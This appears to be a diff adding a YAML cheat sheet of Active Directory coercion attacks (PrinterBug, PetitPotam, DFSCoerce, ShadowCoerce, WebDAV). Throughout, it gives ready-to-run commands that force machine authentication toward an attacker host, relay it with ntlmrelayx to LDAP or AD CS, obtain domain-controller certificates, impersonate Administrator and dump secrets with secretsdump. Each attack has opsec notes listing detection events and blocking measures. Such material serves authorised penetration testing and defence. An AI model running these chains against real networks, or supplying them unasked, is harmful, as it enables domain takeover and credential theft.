@@ -1,0 +1,137 @@
+# Coercion Abuse Commands
+# Attacks: PrintSpooler (PrinterBug), PetitPotam, DFSCoerce, ShadowCoerce, etc.
+
+PrintSpooler:
+  description: "Print Spooler service coercion (PrinterBug/SpoolSample) - force machine authentication"
+  commands:
+    - name: "Coerce authentication via Print Spooler"
+      tool: Impacket
+      command: |
+        python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<TARGET> <ATTACKER_IP>
+    - name: "SpoolSample (Windows)"
+      tool: SpoolSample
+      command: |
+        SpoolSample.exe <TARGET> <ATTACKER_IP>
+    - name: "Capture with Responder"
+      tool: Responder
+      command: |
+        sudo responder -I <INTERFACE> -wrf
+    - name: "Relay to LDAP for RBCD"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t ldap://<DC_IP> --delegate-access --escalate-user <CONTROLLED_USER>
+    - name: "Relay to AD CS"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
+  opsec:
+    - "Requires Print Spooler service running on target"
+    - "Creates Event ID 5145 on target for share access"
+    - "Coerced auth visible in network traffic"
+    - "Can be blocked by disabling Print Spooler"
+
+PetitPotam:
+  description: "PetitPotam coercion via EFSRPC - force machine authentication"
+  commands:
+    - name: "Coerce authentication (authenticated)"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <TARGET>
+    - name: "Coerce authentication (unauthenticated, if vulnerable)"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py <ATTACKER_IP> <TARGET>
+    - name: "Relay to AD CS for DC certificate"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
+        # Then coerce:
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>
+    - name: "Authenticate with obtained certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx dc.pfx -dc-ip <DC_IP>
+    - name: "Relay to LDAP for RBCD"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t ldap://<DC_IP> --delegate-access --escalate-user <CONTROLLED_USER>
+  opsec:
+    - "Uses EFSRPC (Encrypting File System RPC)"
+    - "Patched in recent Windows updates (authentication required)"
+    - "Network traffic visible on port 445"
+    - "Can be blocked by LDAP signing/channel binding"
+
+DFSCoerce:
+  description: "DFSCoerce via MS-DFSNM - force machine authentication"
+  commands:
+    - name: "Coerce authentication via DFS"
+      tool: DFSCoerce
+      command: |
+        python3 dfscoerce.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <TARGET>
+    - name: "Relay coerced authentication"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t ldap://<DC_IP> --delegate-access
+  opsec:
+    - "Uses MS-DFSNM RPC interface"
+    - "Requires valid domain credentials"
+    - "DFS service must be running"
+
+ShadowCoerce:
+  description: "ShadowCoerce via MS-FSRVP (VSS) - force machine authentication"
+  commands:
+    - name: "Coerce authentication via VSS"
+      tool: ShadowCoerce
+      command: |
+        python3 shadowcoerce.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <TARGET>
+  opsec:
+    - "Uses MS-FSRVP (File Server Remote VSS Protocol)"
+    - "VSS service must be enabled"
+
+CoerceToRelay:
+  description: "General coercion to relay attack chain"
+  commands:
+    - name: "Step 1 - Start relay to LDAP for RBCD"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t ldap://<DC_IP> --delegate-access --escalate-user <CONTROLLED_USER>
+    - name: "Step 2 - Coerce target authentication"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <TARGET>
+    - name: "Step 3 - Request ticket for delegated access"
+      tool: Impacket
+      command: |
+        getST.py -spn 'cifs/<TARGET>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/<CONTROLLED_USER>$:<PASSWORD>'
+    - name: "Step 4 - Use ticket"
+      tool: Impacket
+      command: |
+        export KRB5CCNAME=Administrator.ccache
+        secretsdump.py -k -no-pass <TARGET>
+  opsec:
+    - "LDAP signing blocks LDAP relay"
+    - "LDAP channel binding blocks LDAPS relay"
+    - "SMB signing blocks SMB relay"
+    - "Multiple steps visible in logs"
+
+WebDAV:
+  description: "WebDAV coercion for NTLM relay"
+  commands:
+    - name: "Start WebDAV auth server"
+      tool: Responder
+      command: |
+        sudo responder -I <INTERFACE> -wrf
+    - name: "Trigger WebDAV via search connector"
+      tool: note
+      command: |
+        # Create .searchConnector-ms file pointing to attacker
+        # When victim browses folder, WebDAV auth is triggered
+        # WebDAV uses HTTP, bypassing SMB signing requirements
+    - name: "Relay WebDAV to LDAP"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t ldap://<DC_IP> --delegate-access
+  opsec:
+    - "WebDAV client must be installed (default on workstations)"
+    - "Uses HTTP, bypasses SMB signing"
+    - "Requires victim to browse malicious folder"
